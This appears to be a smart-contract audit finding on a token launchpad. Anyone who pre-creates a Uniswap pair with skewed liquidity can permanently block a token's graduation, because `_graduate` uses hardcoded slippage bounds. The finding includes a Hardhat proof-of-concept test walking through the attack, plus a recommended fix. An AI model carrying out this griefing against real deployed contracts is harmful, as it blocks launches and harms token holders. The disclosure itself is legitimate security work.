## Description
The `_graduate` function allows an agent token to graduate and migrate to UniSwap by creating a pool or, if a pool exists already, supplying liquidity to this pool when a buy call successfully passes the graduation threshold. However, if a UniSwap pair is created manually before graduation, the hardcoded slippage protections will cause the `_graduate` call to revert, making it impossible for this token to successfully graduate.

## Vulnerability Details
The `buy` function has the following check to see if a token should graduate.

```solidity
function buy(
    uint256 amountIn_,
    address tokenAddress_
) external payable returns (bool) {
    // rest of the function
    uint256 reservePercentage = (newReserveA * 100) / totalSupply;
    
    if (reservePercentage <= gradThresholdPercent) {
        _graduate(tokenAddress_);
    }

    return true;
}
```

Take a look at the `_graduate` function.

```solidity
function _graduate(address tokenAddress_) private {
    // rest of the function
    address uniswapFactory = uniswapRouter.factory();
    address uniswapPair = IUniswapV2Factory(uniswapFactory).getPair(tokenAddress_, assetTokenAddr);
    
    if (uniswapPair == address(0)) {
        uniswapPair = IUniswapV2Factory(uniswapFactory).createPair(tokenAddress_, assetTokenAddr);
    }
    require(uniswapPair != address(0), "Failed to get/create Uniswap pair");

    // Set token as graduated
    Token(tokenAddress_).graduate(uniswapPair);

    (uint256 amountToken, uint256 amountAsset, uint256 liquidity) = 
        uniswapRouter.addLiquidity(
            tokenAddress_,
            assetTokenAddr,
            tokenBalance,
            assetBalance,
            tokenBalance * 95 / 100,
            assetBalance * 95 / 100,
            address(0),
            block.timestamp + 3600
        );
    
    // rest of the function
}
```

It is observed that, if a pair already exists in UniSwap, the function will simply add liquidity to the existing pool with hardcoded slippage values. However, these slippage values are not set according to the current existing balances of the tokens in the UniSwap pair. This causes the call to revert due to slippage protection, making it impossible for this token to graduate if the UniSwap pair does not satisfy the slippage protection that is implemented.

## Proof of Concept
Implement the following test in the `Manager.test.ts` file and run it to observe the vulnerability.

```javascript
describe("Graduation Attack", function() {
    it.only("does not graduate if pair is created beforehand", async function() {
      const { manager, router, factory, alice, bob, assetToken } = context;
      
      console.log("\n=== Starting The Test ===");

      // 1. Launch token with proper initial liquidity (2k USDC)
      console.log("\n1. Launching Token...");
      const purchaseAmount = ethers.parseEther("2000");
      await assetToken.connect(alice).approve(await manager.getAddress(), purchaseAmount);
      
      const tx = await manager.connect(alice).launch(
        "Test Agent",
        "TEST",
        "Test prompt",
        "Test intention",
        "https://test.com",
        purchaseAmount
      );
      
      const receipt = await tx.wait();
      const event = receipt.logs.find(log => log.fragment?.name === "Launched");
      const agentToken = await ethers.getContractAt("Token", event.args.token);
      const agentTokenAddress = await agentToken.getAddress();

      // Get initial pair info and metrics
      const pair = await ethers.getContractAt("IPair", await factory.getPair(agentTokenAddress, await assetToken.getAddress()));
      const [initialReserveAgent, initialReserveAsset] = await pair.getReserves();
      console.log("\nInitial State:");
      console.log("Initial Agent Reserve:", ethers.formatEther(initialReserveAgent));
      console.log("Initial USDC Reserve:", ethers.formatEther(initialReserveAsset));
      
      const tokenData = await manager.agentTokens(agentTokenAddress);
      console.log("\nInitial Metrics:");
      console.log("Volume:", ethers.formatEther(tokenData.metrics.vol));
      console.log("Market Cap:", ethers.formatEther(tokenData.metrics.mktCap));
      console.log("Liquidity:", ethers.formatEther(tokenData.metrics.liq));
      console.log("Graduation Threshold:", await manager.gradThresholdPercent(), "%");
      
      // 2. Bob buys tokens
      console.log("\n2. Attacker (Bob) buying tokens...");
      const buyAmount = ethers.parseEther("50");
      await assetToken.connect(bob).approve(await router.getAddress(), buyAmount);
      await manager.connect(bob).buy(buyAmount, agentTokenAddress);
      
      const bobAgentBalance = await agentToken.balanceOf(await bob.getAddress());
      console.log("\nPost-Buy State:");
      console.log("Bob's Agent Balance:", ethers.formatEther(bobAgentBalance));
      
      const [postBuyReserveAgent, postBuyReserveAsset] = await pair.getReserves();
      console.log("Post-Buy Agent Reserve:", ethers.formatEther(postBuyReserveAgent));
      console.log("Post-Buy USDC Reserve:", ethers.formatEther(postBuyReserveAsset));
      
      // 3. Create malicious Uniswap pair
      console.log("\n3. Creating malicious Uniswap pair...");
      const uniswapRouter = await ethers.getContractAt(
        "IUniswapV2Router02",
        await manager.uniswapRouter()
      );
      
      const tinyAmount = ethers.parseEther("1");
      await assetToken.connect(bob).approve(await uniswapRouter.getAddress(), tinyAmount);
      await agentToken.connect(bob).approve(await uniswapRouter.getAddress(), bobAgentBalance);
      
      console.log("\nAdding skewed liquidity to Uniswap:");
      console.log("USDC amount:", ethers.formatEther(tinyAmount));
      console.log("Agent token amount:", ethers.formatEther(bobAgentBalance / 50n));
      
      await uniswapRouter.connect(bob).addLiquidity(
        await assetToken.getAddress(),
        agentTokenAddress,
        tinyAmount,
        bobAgentBalance / 50n,
        0,
        0,
        await bob.getAddress(),
        Math.floor(Date.now() / 1000) + 3600
      );
      
      // 4. Attempt graduation - should revert
      console.log("\n4. Alice first buy for 991 USDC");
      const graduationAmount = ethers.parseEther("991");
      const secondAmount = ethers.parseEther("0.17647");
      const thirdAmount = ethers.parseEther("0.000001");
      await assetToken.connect(alice).approve(await router.getAddress(), graduationAmount);
      await manager.connect(alice).buy(graduationAmount, agentTokenAddress);
      console.log("First buy successful");

      console.log("\n4. Attempting graduation...");
      await assetToken.connect(alice).approve(await router.getAddress(), graduationAmount);
      await manager.connect(alice).buy(secondAmount, agentTokenAddress);
      console.log("Second buy successful");

      // Final buy should fail due to graduation attempt
      let failed = false;
      try {
        await manager.connect(alice).buy(thirdAmount, agentTokenAddress);
      } catch (e: any) {
        failed = true;
        expect(e.message).to.include("INSUFFICIENT_A_AMOUNT");
      }
      expect(failed).to.be.true;
      console.log("Final buy failed as expected with INSUFFICIENT_A_AMOUNT");

      const postGrad = await manager.agentTokens(agentTokenAddress);
      console.log("\nPost-Graduation State:");
      console.log("Token graduated:", postGrad.hasGraduated);
      console.log("Is trading:", postGrad.isTrading);

      // Verify final state
      expect(postGrad.hasGraduated).to.be.false;
      expect(postGrad.isTrading).to.be.true;

      console.log("\n=== Graduation Attack Test Complete ===\n");
    });
});
```

## Impact
It will not be possible to graduate this token while the UniSwap pair does not satisfy the hardcoded slippage values.

## Recommendation
If a pair already exists, the slippage values should be dynamic according to the reserves in this pool. Alternatively, allow a configurable slippage protection that can be inputted by users during the buy call.

## Note
The Chirper AI team set the slippage protection during graduation to 0. This may let the graduation call vulnerable to sandwich attacks, but the developers stated it will be fixed in the near future.
